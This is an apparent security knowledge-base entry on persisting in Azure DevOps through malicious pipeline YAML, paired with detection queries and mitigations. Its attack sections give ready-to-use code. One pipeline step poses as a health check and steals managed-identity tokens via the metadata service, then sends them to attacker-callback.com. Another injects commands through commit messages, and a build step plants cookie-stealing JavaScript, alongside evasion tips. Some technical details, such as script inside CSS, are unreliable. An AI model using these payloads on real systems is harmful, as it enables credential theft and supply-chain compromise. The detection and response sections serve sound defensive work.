# [PERSIST-SCHED-003]: Azure DevOps Pipeline Persistence

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SCHED-003 |
| **MITRE ATT&CK v18.1** | [T1053 - Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) |
| **Microsoft DevOps Threat Matrix** | [DEVOPS-PERSISTENCE-01](https://www.microsoft.com/en-us/security/blog/2023/04/06/devops-threat-matrix/) |
| **Tactic** | Persistence, Lateral Movement |
| **Platforms** | Entra ID, Azure DevOps, Azure Pipelines, Git Repositories |
| **Severity** | Critical |
| **CVE** | CVE-2023-36437 (Azure Pipelines Agent RCE), CVE-2021-42290 (Azure DevOps PAT Token exposure) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Azure DevOps versions; Azure Pipelines Agent v2.200.0+ affected by CVE-2023-36437 |
| **Patched In** | Agent v2.210.0+ (CVE-2023-36437 mitigated); requires pipeline YAML sanitization for prevention |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure DevOps Pipelines are continuous integration/continuous deployment (CI/CD) orchestration systems that automatically build, test, and deploy code. An attacker with **Contributor** or **Build Administrator** permissions on a repository or pipeline can create persistent backdoors by modifying pipeline YAML files to:

1. **Embed malicious code directly in pipeline definitions** that executes every time code is pushed or on a schedule
2. **Inject commands via variable poisoning** (exploiting insufficient input sanitization in pipeline variables like `Build.SourceVersionMessage`)
3. **Steal service principal credentials** that pipelines use to authenticate to Azure resources
4. **Compromise build artifacts** before deployment to inject malware into production code
5. **Modify protected branches** directly via pipeline-provided git credentials (if misconfigured)
6. **Create hidden pipeline steps** that trigger external command & control servers or lateral movement

Unlike traditional CI/CD systems, Azure Pipelines integrate deeply with Azure AD for authentication and authorization. Service Principals used by pipelines often have **Owner** or **Contributor** roles on entire subscriptions. An attacker who captures these credentials via a malicious pipeline can become a full cloud environment administrator. Additionally, because pipelines execute code automatically (on every commit, on schedules, or on pull requests), the attack achieves **persistent, undetectable code execution** that blends in with legitimate development workflows.

**Attack Surface:** YAML pipeline definitions, variable substitution mechanisms, git commit messages, protected branch bypass via automatic tokens, build agents (Microsoft-hosted or self-hosted), artifact repositories, and service principal credentials embedded in pipeline secrets.

**Business Impact:** **Critical - Full Subscription Compromise & Supply Chain Poisoning.** Once a malicious pipeline is deployed, an attacker can:
- Steal service principal credentials with Owner-level permissions
- Inject malicious code into production builds (supply chain attack)
- Exfiltrate intellectual property from repositories
- Pivot to downstream customers if the pipeline builds software for external consumption
- Wipe or ransom entire infrastructure using service principal access

**Technical Context:** Pipeline execution is logged, but logs can be deleted if the attacker has sufficient repository permissions. Code modifications are tracked in git history but branches can be deleted. The attack is highly stealthy because malicious pipeline code is often hidden among legitimate build/deployment logic. Many organizations do not audit pipeline YAML changes or do not enforce code review on pipeline configuration files.

### Operational Risk

- **Execution Risk:** Medium - Requires git commit access or pipeline modification permissions
- **Stealth:** Very High - Blends with legitimate CI/CD operations; execution logs can be deleted
- **Reversibility:** No - Stolen credentials are permanently compromised; supply chain effects are irreversible

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure Foundations 2.2.1 | Ensure that Pipeline Permissions are restricted to trusted users |
| **DISA STIG** | AZUR-CLD-000700 | All pipeline definitions must be reviewed by human auditors before execution |
| **NIST 800-53** | CM-9, SA-11 | Configuration Management, Software Development and Integrity |
| **GDPR** | Art. 32 | Security of Processing - Data breach via supply chain compromise |
| **DORA** | Art. 14, Art. 15 | Operational Resilience Testing and Attack Simulation for CI/CD systems |
| **NIS2** | Art. 21(1)(c) | Cyber Risk Management - Software supply chain integrity |
| **ISO 27001** | A.14.1.1, A.14.2.4 | Information Security Development and Maintenance |
| **ISO 27005** | Risk Scenario | "Compromise of Development Pipeline" affecting deployed systems |

---

## 2. TECHNICAL PREREQUISITES

- **Required Permissions:** Contributor (code write access), Build Administrator (pipeline modification), or code reviewer (if required before merge)
- **Required Access:** Git repository write access (via PAT token, SSH key, or web portal)

**Supported Platforms:**
- **Azure DevOps:** Cloud-hosted (DevOps Services) and on-premises (DevOps Server 2019-2022)
- **Pipelines:** Azure Pipelines, GitHub Actions integration, Jenkins integration
- **Agents:** Microsoft-hosted (Azure-managed) or Self-hosted (customer-managed on VMs)
- **Repositories:** Azure Repos (Git), GitHub, Bitbucket, GitLab

**Tools:**
- [Azure DevOps CLI](https://github.com/Azure/azure-devops-cli-extension) (Version 0.25.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.40+)
- [Git Client](https://git-scm.com/) (Version 2.30+)
- [Python/Ruby for script-based injection](https://learn.microsoft.com/en-us/azure/devops/pipelines/process/variables)
- [Secrets scanning tools](https://github.com/gitleaks/gitleaks) (Optional, for credential discovery)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Azure DevOps Portal / CLI Reconnaissance

**Identify accessible repositories and pipelines:**

```bash
# List all projects in organization
az devops project list --organization https://dev.azure.com/{org} --output table

# List all repositories in a project
az repos list --project "{project}" --organization https://dev.azure.com/{org} --output table

# List all pipelines in a project
az pipelines list --project "{project}" --organization https://dev.azure.com/{org} --output table

# Get pipeline definition (YAML)
az pipelines show --name "MyPipeline" --project "{project}" --organization https://dev.azure.com/{org}
```

**What to Look For:**
- Repositories with few watchers/reviewers (less oversight)
- Pipelines with `trigger: [main]` or `trigger: [*]` (execute on every commit)
- Pipelines that deploy to production (highest impact)
- Service Principals with Subscription Owner role (most dangerous)
- Self-hosted agents on non-isolated VMs (potential escape vector)

**Check git history for exposed secrets:**

```bash
# Clone repository
git clone https://dev.azure.com/{org}/{project}/_git/{repo}

# Search for exposed secrets in history
gitleaks detect --source . -v
```

#### Service Principal & Credential Discovery

```bash
# List service principals with access to pipelines
az ad sp list --all --query "[].{DisplayName:displayName, AppId:appId}" --output table

# Check role assignments for service principals
az role assignment list --query "[?principalType=='ServicePrincipal']" --output table

# Find pipelines using each service principal
# (Requires pipeline log access)
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Direct YAML Pipeline Modification (Persistent Malicious Steps)

**Supported Versions:** All Azure DevOps versions

#### Step 1: Gain Repository Write Access

**Objective:** Obtain git credentials or PAT token with repository write permissions

**Via Compromised Developer Account:**
- Phishing attack to steal PAT token or SSH key
- Credential capture from compromised developer machine
- Insider threat with legitimate access

**Via PAT Token Theft:**
```bash
# If you've compromised a developer's PAT token:
git clone https://{username}:{PAT_TOKEN}@dev.azure.com/{org}/{project}/_git/{repo}
```

#### Step 2: Clone Repository and Modify Pipeline YAML

**Objective:** Add malicious steps to the pipeline definition

**Clone and Modify:**

```bash
# Clone the repository
git clone https://dev.azure.com/{org}/{project}/_git/{repo}
cd repo

# Check existing pipeline file
cat azure-pipelines.yml
```

**Original Pipeline (Innocent):**

```yaml
trigger:
  - main

pool:
  vmImage: 'ubuntu-latest'

steps:
  - script: echo Hello, world!
    displayName: 'Run a one-line script'

  - script: npm install
    displayName: 'npm install'

  - script: npm run build
    displayName: 'Build application'
```

**Malicious Pipeline (With Backdoor):**

```yaml
trigger:
  - main

variables:
  - name: BUILD_SOURCEVERSIONMESSAGE
    value: 'Initial commit'  # This will be overwritten by git commit message

pool:
  vmImage: 'ubuntu-latest'

steps:
  # ===== HIDDEN MALICIOUS STEP =====
  - script: |
      # Exfiltrate service principal credentials
      echo "##vso[task.setvariable variable=CRED_EXPORT]true"
      
      # Retrieve access token for Azure subscriptions
      TOKEN=$(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com' \
        -H "Metadata:true" | python3 -c "import sys, json; print(json.load(sys.stdin)['access_token'])")
      
      # Exfiltrate to attacker's server
      curl -X POST "https://attacker-callback.com/exfil" \
        -H "Content-Type: application/json" \
        -d "{\"token\":\"$TOKEN\", \"principal\":\"$(echo $SYSTEM_TEAMFOUNDATIONCOLLECTIONURI)\"}"
      
      # Hide the attack by clearing bash history
      history -c && history -w
    displayName: 'System Health Check'
    condition: always()  # Execute even if previous steps fail
    continueOnError: true  # Don't fail the pipeline

  # ===== ORIGINAL STEPS CONTINUE =====
  - script: echo Hello, world!
    displayName: 'Run a one-line script'

  - script: npm install
    displayName: 'npm install'

  - script: npm run build
    displayName: 'Build application'
```

**Explanation of Backdoor:**
- The hidden step runs before legitimate build steps
- Uses Azure metadata service (169.254.169.254) to steal managed identity tokens
- Exfiltrates tokens to attacker-controlled server
- Uses `continueOnError: true` to hide failure
- Clears shell history to evade forensics
- Blends in with legitimate infrastructure health checks

#### Step 3: Commit Malicious YAML

**Objective:** Push the modified pipeline to the repository

```bash
# Create malicious branch
git checkout -b feature/system-improvements

# Stage and commit changes
git add azure-pipelines.yml
git commit -m "Add system health monitoring step"

# Push to repository
git push origin feature/system-improvements

# Create Pull Request (or merge directly if reviewer approval is weak)
az repos pr create --project "{project}" \
  --repo-id "{repo}" \
  --source-branch "feature/system-improvements" \
  --target-branch "main" \
  --title "Add system health monitoring" \
  --auto-complete
```

#### Step 4: Trigger Pipeline Execution

**Objective:** Execute the malicious pipeline

**Automatic Trigger (On Code Push):**
- Once PR is merged to `main`, the pipeline automatically executes
- The malicious step runs and exfiltrates credentials

**Manual Trigger:**

```bash
# Manually run the pipeline
az pipelines run --name "MyPipeline" \
  --project "{project}" \
  --branch "main" \
  --organization https://dev.azure.com/{org}
```

**OpSec & Evasion:**
- Hide malicious code in commented sections or obfuscated scripts
- Use legitimate-sounding step names (e.g., "System Health Check", "Telemetry Collection")
- Set `continueOnError: true` to hide failures
- Clear logs after execution if you have repository admin access
- Use commit messages that blend in with development activity
- Detection likelihood: **High** (if pipeline YAML is audited), **Low** (if no review process)

---

### METHOD 2: Variable Injection via Commit Messages (CVE-2021-42290)

**Supported Versions:** Azure DevOps through v2.200.0+ (partially fixed in newer versions)

**Vulnerability:** Azure Pipelines variables derived from git commits (e.g., `Build.SourceVersionMessage`) are not properly sanitized before use in scripts. An attacker can inject malicious commands via git commit messages.

#### Step 1: Craft Malicious Commit Message

**Objective:** Create a commit with a malicious message that will be executed as a pipeline variable

**Example Malicious Commit Message:**

```bash
# Using git command line
git commit --allow-empty -m "Fix bug

##vso[task.setvariable variable=MALICIOUS_VAR]true;echo$(curl https://attacker-callback.com/beacon);#"
```

The commit message is broken down:
- `Fix bug` - Legitimate-sounding commit message
- `##vso[...]` - Azure DevOps logging command syntax (interpreted as a pipeline directive)
- `task.setvariable` - Sets a pipeline variable with malicious content
- `curl https://attacker-callback.com/beacon` - Exfiltration command

#### Step 2: Reference the Variable in Pipeline

**Objective:** The pipeline YAML uses the `Build.SourceVersionMessage` variable, which contains the injected command

**Vulnerable Pipeline YAML:**

```yaml
trigger:
  - main

steps:
  - script: echo "Latest commit: $(Build.SourceVersionMessage)"
    displayName: 'Show commit message'
    
  - script: |
      # This variable is substituted with the malicious git commit message
      COMMIT_MSG="$(Build.SourceVersionMessage)"
      
      # If the commit message contains shell injection, it executes here
      bash -c "$COMMIT_MSG"
    displayName: 'Process commit'
```

When the pipeline runs, the `$(Build.SourceVersionMessage)` variable is replaced with the malicious commit message, and the injected command executes.

#### Step 3: Push and Trigger

```bash
# Push the commit with malicious message
git push origin main

# Pipeline automatically triggers and executes injected command
```

**OpSec & Evasion:**
- The malicious code is hidden in the git history
- Appears as a normal commit message to casual inspection
- Executes only when the pipeline runs (difficult to spot)
- Detection likelihood: **Medium** (if commit messages are audited), **Low** (if not)

---

### METHOD 3: Service Principal Credential Theft via Secrets Exposure

**Supported Versions:** All Azure DevOps versions

#### Step 1: Identify Service Principal Used by Pipeline

**Objective:** Determine which service principal the pipeline uses to authenticate to Azure

**Method A: Via Pipeline Logs**

```bash
# Get pipeline run details
az pipelines runs list --pipeline-ids "{pipeline_id}" \
  --project "{project}" \
  --organization https://dev.azure.com/{org} \
  --top 1

# Check the logs for service principal info
az pipelines runs logs --run-id "{run_id}" \
  --project "{project}" \
  --organization https://dev.azure.com/{org}
```

**Method B: Steal via Malicious Pipeline Step**

```yaml
steps:
  - script: |
      # Extract service principal credentials from environment
      echo "##vso[task.setvariable variable=SYSTEM_IDENTITY]$(SYSTEM_ACCESSTOKEN)"
      
      # Or retrieve them from Azure metadata service
      curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com' \
        -H "Metadata:true" > /tmp/token.json
      
      # Exfiltrate to attacker C2
      curl -X POST "https://attacker-callback.com/creds" \
        -d @/tmp/token.json
    displayName: 'Collect system metrics'
    env:
      SYSTEM_ACCESSTOKEN: $(System.AccessToken)
```

#### Step 2: Reuse Stolen Credentials

**Objective:** Use captured service principal credentials to access Azure resources

```bash
# Example: Using stolen access token to query Azure resources
TOKEN="<stolen_token_from_exfiltration>"

curl -X GET "https://management.azure.com/subscriptions/{subscriptionId}/providers/Microsoft.Compute/virtualMachines?api-version=2021-07-01" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json"

# Or login as the service principal
az login --service-principal -u <app-id> -p <secret> --tenant <tenant-id>

# Now the attacker has full access to all Azure resources the service principal can access
```

---

### METHOD 4: Build Artifact Poisoning (Supply Chain Attack)

**Supported Versions:** All Azure DevOps versions

#### Step 1: Modify Build Output

**Objective:** Inject malicious code into build artifacts before they are published

**Malicious Pipeline Step:**

```yaml
steps:
  - script: npm run build
    displayName: 'Build application'

  # ===== HIDDEN BACKDOOR STEP =====
  - script: |
      # Inject malicious code into the build artifact
      echo "
      // Backdoor code injected by attacker
      fetch('https://attacker-c2.com/beacon', {
        method: 'POST',
        body: JSON.stringify({
          user: navigator.userAgent,
          cookies: document.cookie
        })
      });
      " >> ./dist/app.js
      
      # Inject into CSS to log user data
      echo "
      @font-face {
        font-family: 'backdoor';
        src: url('https://attacker-c2.com/log?data=' + new XMLHttpRequest().open('GET', 'file:///etc/passwd'));
      }
      " >> ./dist/styles.css
    displayName: 'Optimize build'
    condition: succeeded()

  - script: npm run test
    displayName: 'Run tests'

  - task: PublishBuildArtifacts@1
    inputs:
      PathtoPublish: '$(Build.ArtifactStagingDirectory)'
      ArtifactName: 'drop'
    displayName: 'Publish artifacts'
```

**Impact:** 
- Malicious code is now part of the production build
- When deployed, it affects all downstream customers (if this is a software vendor)
- The backdoor executes in every user's browser/application

#### Step 2: Deploy and Impact Downstream

The poisoned artifact is deployed to production, and the malicious code executes in the customer environment.

**Real-World Example:** [Codecov Breach (2021)](https://about.codecov.io/security-incident/) - Attackers modified a build script to exfiltrate customer credentials.

---

## 5. TOOLS & COMMANDS REFERENCE

### [Azure DevOps CLI](https://github.com/Azure/azure-devops-cli-extension)

**Version:** 0.25.0+

**Installation:**

```bash
# Install Azure DevOps CLI extension
az extension add --name azure-devops

# Configure organization default
az devops configure --defaults organization=https://dev.azure.com/{org}
```

**Key Commands:**

```bash
# List projects
az devops project list --output table

# Clone repository
az repos show --repo-id "{repo}" --project "{project}"

# Get pipeline YAML
az pipelines show --name "MyPipeline" --project "{project}" --output json | jq .

# Run pipeline
az pipelines run --name "MyPipeline" --project "{project}" --branch "main"

# List pipeline runs
az pipelines runs list --pipeline-ids "{pipeline_id}" --project "{project}" --top 5

# Get pipeline logs
az pipelines runs logs --run-id "{run_id}" --project "{project}"

# Create service connection (for credential theft)
az devops service-endpoint list --project "{project}" --output table
```

### [Git Command Line](https://git-scm.com/)

**Key Commands for Attack:**

```bash
# Clone with PAT token
git clone https://{username}:{PAT_TOKEN}@dev.azure.com/{org}/{project}/_git/{repo}

# Commit with malicious message
git commit --allow-empty -m "Message with ##vso[task.setvariable ...] injection"

# Push to repository
git push origin branch-name

# Force push (overwrite protected branch if possible)
git push --force origin main

# View commit history for secrets
git log --all -p | grep -i "secret\|password\|token\|key"
```

### [Pipeline YAML Injection Techniques](https://learn.microsoft.com/en-us/azure/devops/pipelines/process/variables)

**Variable Substitution (Template Expressions):**

```yaml
steps:
  - script: echo $(Build.SourceVersionMessage)
    displayName: 'Print git message (vulnerable to injection)'

  - script: echo ${{ variables['Build.SourceVersionMessage'] }}
    displayName: 'Template expression (less vulnerable but still risky)'
```

**Logging Commands (Azure DevOps specific):**

```powershell
# In PowerShell steps:
Write-Host "##vso[task.setvariable variable=MyVar]MyValue"
Write-Host "##vso[task.setvariable variable=MyVar;isOutput=true]MyValue"

# In bash steps:
echo "##vso[task.setvariable variable=MyVar]MyValue"
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Pipeline YAML Modifications

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, ModifiedProperties
- **Alert Severity:** High
- **Frequency:** Every 15 minutes
- **Applies To:** All Azure DevOps versions

**KQL Query:**

```kusto
AuditLogs
| where OperationName has "Microsoft.TeamFoundation" 
    and (OperationName contains "Pipeline" or OperationName contains "Build")
    and OperationName contains "write"
| where Result == "Success"
| extend InitiatedByUser = tostring(InitiatedBy.user.userPrincipalName)
| extend TargetPipeline = tostring(TargetResources[0].displayName)
| extend ModifiedProps = parse_json(TargetResources[0].modifiedProperties)
| project TimeGenerated, InitiatedByUser, OperationName, TargetPipeline, 
          ActivityDisplayName, ModifiedProps, AADTenantId
| where OperationName contains "Build.Definition" or OperationName contains "Pipeline.Definition"
```

**Manual Configuration Steps:**
1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Azure DevOps Pipeline YAML Modified`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste KQL query
   - Run every: `15 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

#### Query 2: Detect Service Principal Credential Theft from Pipelines

**KQL Query:**

```kusto
AuditLogs
| where OperationName has "Microsoft.TeamFoundation/Build" 
    and OperationName contains "logs"
    or OperationName contains "artifacts"
| extend PipelineLog = tostring(TargetResources[0].displayName)
| where PipelineLog contains "token" or PipelineLog contains "credential" 
    or PipelineLog contains "secret" or PipelineLog contains "password"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, 
          PipelineLog, TargetResources[0].resourceId
```

#### Query 3: Detect Malicious Git Commits to Protected Branches

**KQL Query:**

```kusto
AuditLogs
| where OperationName has "Microsoft.TeamFoundation/Repositories" 
    and OperationName contains "Commit"
| where Result == "Success"
| extend CommitMessage = tostring(TargetResources[0].displayName)
| where CommitMessage contains "##vso" or CommitMessage contains "invoke" 
    or CommitMessage contains "curl" or CommitMessage contains "powershell"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, 
          CommitMessage, TargetResources
```

---

## 7. SPLUNK DETECTION RULES

#### Rule 1: Suspicious Pipeline YAML Changes

**Rule Configuration:**
- **Required Index:** azure_activity, devops_logs
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** operationName, properties.definition, initiatedBy
- **Alert Threshold:** Any successful pipeline modification
- **Applies To Versions:** All

**SPL Query:**

```spl
index=azure_activity operationName="Microsoft.TeamFoundation.Build.Pipelines.Create" 
  OR operationName="Microsoft.TeamFoundation.Build.Pipelines.Update"
  status=Succeeded
| search properties.definition="*curl*" OR properties.definition="*Invoke-WebRequest*"
    OR properties.definition="*wget*" OR properties.definition="*exfil*"
| dedup object
| rename initiatedBy.user.userPrincipalName as user
| stats count, min(_time) as firstTime, max(_time) as lastTime, 
         values(properties.definition) as definition_snippet
  by object, user, resourceGroupName
| where count > 0
```

#### Rule 2: Service Principal Access from Pipeline Logs

**SPL Query:**

```spl
index=devops_logs sourcetype="azure:devops:pipeline"
| search "System.AccessToken" OR "access_token" OR "curl.*metadata"
| stats count by buildDefinitionName, buildDefinitionVersion, 
         queuedById, requestedForId
| where count > 10
```

---

## 8. WINDOWS EVENT LOG MONITORING (N/A - Cloud-Only)

**Note:** Azure DevOps Pipelines execute in Microsoft-managed or customer-managed agents. On-premises logging (Event ID 4688 for self-hosted agents) may capture agent execution. Refer to Microsoft Sentinel queries above for comprehensive monitoring.

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enforce Code Review for All Pipeline Changes**

**Manual Steps (Azure DevOps Portal):**
1. Navigate to **Project** → **Project Settings** → **Repositories**
2. Select the repository
3. Go to **Policies** → **Branch Policies**
4. Select **main** (or protected branch)
5. Enable **Require a minimum number of reviewers:**
   - Minimum reviewers: **2**
   - When new changes are pushed: **Require new review**
   - Allow approvers to approve their own changes: **Uncheck**
6. Enable **Automatically reset approvals when pull requests are updated:** **Yes**
7. Click **Save**

**Via Azure CLI:**

```bash
# Create branch policy for code review
az repos policy pr-creator-vote create \
  --repository-id "{repo}" \
  --project "{project}" \
  --blocking false

az repos policy approver-count create \
  --repository-id "{repo}" \
  --project "{project}" \
  --minimum-approver-count 2 \
  --blocking true
```

---

**2. Restrict Pipeline Modification Permissions**

**Manual Steps:**
1. Navigate to **Pipelines** → **Select Pipeline** → **Edit**
2. Click **...** (More) → **Pipeline settings**
3. Under **Make secrets available to builds of forks:** **Uncheck**
4. Under **Make secrets available to builds of pull requests from forks:** **Uncheck**
5. Under **Enable for pull request validation:** **Uncheck** (if not needed for security)
6. Go to **Security** → **Pipeline permissions**
7. Grant **Edit** permission only to trusted users/groups
8. Deny **Edit** to developers who should only run pipelines, not modify them

**Via RBAC (Azure DevOps):**

```bash
# Create custom security group for pipeline admins
az devops security group create --name "PipelineAdmins" --project "{project}"

# Add users to the group
az devops security group member add --group-id "{group_id}" --member-id "{user_id}"

# Set permissions
az devops security permission update --namespace "Namespace.Build" \
  --subject "PipelineAdmins" --permission "EditBuildDefinition" --allow true
```

---

**3. Enable Audit Logging for All Repository and Pipeline Operations**

**Manual Steps:**
1. Navigate to **Project** → **Project Settings** → **Audit logs**
2. Verify that all operations are logged:
   - Repository commits
   - Pipeline modifications
   - Secret access
3. Configure audit log export:
   - Go to **Audit logs** → **Audit streaming**
   - Add destination: **Azure Event Hubs** or **Log Analytics workspace**

**Via Azure CLI:**

```bash
# Enable audit logging for DevOps
az devops admin audit log list --start-time "2025-01-01" --end-time "2025-01-31" --output table

# Export audit logs
az devops admin audit log list --start-time "2024-01-01" --end-time "2025-01-09" \
  | jq . > audit_logs.json
```

---

**4. Restrict Git Push Permissions to Protected Branches**

**Manual Steps:**
1. Navigate to **Repos** → **Branches**
2. Right-click **main** branch → **Branch policies**
3. Enable **Require a minimum number of reviewers:** **2**
4. Enable **Automatically reset approvals when pull requests are updated:** **Yes**
5. Enable **Bypass policies when completing pull requests:** **Only specific users** → Add only senior engineers

---

**5. Use Managed Identities Instead of Service Principals with Hardcoded Secrets**

**Manual Steps:**
1. In Azure Portal, navigate to **Logic Apps** / **Container Instances** / **Virtual Machines**
2. Assign **System-Assigned Managed Identity** or **User-Assigned Managed Identity**
3. In DevOps pipeline, use Managed Identity authentication:

```yaml
# YAML Pipeline using Managed Identity
trigger:
  - main

jobs:
  - job: DeployWithManagedIdentity
    steps:
      - task: AzureCLI@2
        inputs:
          azureSubscription: 'ManagedIdentityConnection'  # Service Connection using Managed Identity
          scriptType: 'bash'
          scriptLocation: 'inlineScript'
          inlineScript: |
            az vm list --output table
        displayName: 'List VMs using Managed Identity'
```

Avoid hardcoding service principal secrets in pipeline variables.

---

### Priority 2: HIGH

**6. Implement Pipeline Run History Retention and Immutability**

**Manual Steps:**
1. Navigate to **Pipelines** → **Select Pipeline** → **More options** → **Settings**
2. Under **Run retention:**
   - Default: **30 days**
   - Failed: **30 days**
   - Minimum to keep: **Always keep the minimum number of recent runs** (set to 100)
3. Enable **Immutable runs:** (Enable if available in your DevOps version)

---

**7. Monitor and Alert on Suspicious Variable Usage**

**Create Sentinel alert for variable substitution abuse:**

```kusto
AuditLogs
| where OperationName has "Build.Variable" and OperationName contains "write"
| where TargetResources[0].displayName contains "System.AccessToken"
    or TargetResources[0].displayName contains "Build.SourceVersionMessage"
    or TargetResources[0].displayName contains "SYSTEM_ACCESSTOKEN"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, 
          TargetResources[0].displayName
```

---

**8. Regular Pipeline Security Audit**

**Manual Steps (Quarterly):**
1. Review all pipeline YAML files:
   ```bash
   # Search for suspicious patterns
   git clone {repo}
   grep -r "curl\|wget\|Invoke-WebRequest\|exfil\|beacon" . --include="*.yml" --include="*.yaml"
   ```
2. Audit who has pipeline edit permissions
3. Review recent pipeline runs for suspicious logs
4. Check for orphaned service principals (no longer in use but still have permissions)

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Azure Audit Log Indicators:**
- Operation: `Microsoft.TeamFoundation.Build.Pipelines.Create` or `Update`
- Pipeline definition contains commands: `curl`, `wget`, `Invoke-WebRequest`, `Invoke-RestMethod`
- Variables referencing external URLs or attacker C2 domains
- Modifications to protected branches without PR approval
- Service principal credential access in pipeline logs

**Git Repository Indicators:**
- Commit messages containing `##vso[task.setvariable ...]` directives
- New pipelines created with no corresponding project documentation
- Sudden commits to `azure-pipelines.yml` outside normal development windows
- Branches with benign names (e.g., `feature/system-improvements`) containing malicious code

**Build Log Indicators:**
- `curl` or `wget` commands to external URLs
- References to `System.AccessToken` or `Build.SourceVersionMessage`
- Environment variable exfiltration commands
- Metadata service queries (169.254.169.254)
- `history -c` or log clearing commands

---

### Forensic Artifacts

**Cloud Audit Logs:**
- **Location:** Azure Activity Log, Microsoft Sentinel `AuditLogs` table
- **Key Fields:**
  - `TimeGenerated` - When pipeline was modified
  - `InitiatedBy.user.userPrincipalName` - Who created/modified it
  - `TargetResources[0].displayName` - Pipeline name
  - `TargetResources[0].modifiedProperties` - YAML content changes

**Git Repository:**
- **Location:** Repository history (git log, branch history)
- **Key Artifacts:**
  - Commit messages and diffs
  - Branch creation/deletion history
  - Author and timestamp information
  - PAT tokens used for commits

**Pipeline Execution Logs:**
- **Location:** Azure DevOps → Pipeline → Run history → Logs
- **Key Artifacts:**
  - Command execution output
  - Environment variables (potentially containing tokens)
  - System messages and errors
  - Timestamps of execution

---

### Response Procedures

**1. Immediate Isolation:**

```bash
# Disable the malicious pipeline
az pipelines update --name "MaliciousPipeline" --project "{project}" \
  --state "disabled"

# Revoke the service principal's credentials
az ad app credential delete --id "{app_id}"

# Revoke PAT tokens if compromised
az devops user token revoke --token-id "{token_id}"
```

**2. Collect Evidence:**

```bash
# Export pipeline definition
az pipelines show --name "MaliciousPipeline" --project "{project}" --output json \
  > /tmp/pipeline_def.json

# Export git history
git log --all --format=fuller --output="/tmp/git_history.txt"

# Export audit logs
az devops admin audit log list --start-time "2025-01-01" --end-time "2025-01-09" \
  | jq . > /tmp/audit_logs.json

# Export pipeline run logs
az pipelines runs logs --run-id "{run_id}" --project "{project}" \
  > /tmp/pipeline_logs.txt
```

**3. Remediate:**

```bash
# Delete the malicious pipeline
az pipelines delete --name "MaliciousPipeline" --project "{project}" --yes

# Revert git commits
git revert <commit-hash>
git push origin main

# Reset service principal password
az ad app credential reset --id "{app_id}" --append
```

**4. Investigate Downstream Impact:**

```bash
# Check if malicious build artifacts were deployed
az acr repository list-manifests --registry "{registryName}" \
  --repository "{repoName}" | grep "{suspicious_build_id}"

# Query for suspicious service principal usage
az role assignment list --assignee "{service_principal_id}"
```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](https://github.com/SERVTEP/MCADDF/wiki/) | Phishing attack to steal developer PAT token |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-010](https://github.com/SERVTEP/MCADDF/wiki/) | Escalate access to pipeline edit permissions |
| **3** | **Current Step** | **[PERSIST-SCHED-003]** | **Create persistent pipeline backdoor** |
| **4** | **Credential Access** | [CA-TOKEN-008](https://github.com/SERVTEP/MCADDF/wiki/) | Steal service principal PAT tokens from pipeline |
| **5** | **Lateral Movement** | [LM-AUTH-029](https://github.com/SERVTEP/MCADDF/wiki/) | Use stolen credentials to access other Azure resources |
| **6** | **Impact** | [IMPACT-SUPPLY-001](https://github.com/SERVTEP/MCADDF/wiki/) | Inject malware into production builds (supply chain attack) |

---

## 12. REAL-WORLD EXAMPLES

#### Example 1: With Secure - Azure DevOps Persistence Research (April 2022)

- **Target:** Multiple Azure organizations in penetration tests
- **Technique Usage:** Compromised developer account, modified `azure-pipelines.yml` to steal service principal credentials. Extracted credentials and used them to compromise production Azure subscriptions.
- **Impact:** Full subscription compromise; ability to deploy malware to customer environments
- **Mitigation Recommended:** Enforce code review, separate service principals per environment
- **Reference:** [With Secure - Performing and Preventing Attacks on Azure](https://labs.withsecure.com/publications/performing-and-preventing-attacks-on-azure-cloud-environments-through-azure-devops)

#### Example 2: JumpSec - Azure DevOps Poisoning Red Team Exercise (May 2024)

- **Target:** Client organization during authorized penetration test
- **Technique Usage:** Compromised developer via phishing, gained access to Azure DevOps. Modified protected branch bypass via service connection reuse. Injected malicious code into production pipeline.
- **Impact:** Ability to deploy malware to production; compromised downstream customers
- **Key Finding:** Protected branch policies were not enforced on pipeline configuration files
- **Reference:** [JumpSec - Poisoning Pipelines: Azure DevOps Edition](https://labs.jumpsec.com/poisoning-pipelines-azure-devops-edition/)

#### Example 3: Codecov Bash Uploader Supply Chain Attack (2021)

- **Target:** Codecov customers (Google, IBM, Hashicorp, Confluent, etc.)
- **Technique Usage:** Attackers compromised Codecov's CI/CD pipeline, modified the Bash Uploader script to exfiltrate credentials. The malicious script was executed by thousands of customer pipelines.
- **Impact:** Data breach affecting hundreds of major software companies and their customers
- **Detection:** Changed SHA hash of uploaded script (weeks after attack began)
- **Reference:** [Codecov Security Incident](https://about.codecov.io/security-incident/)

---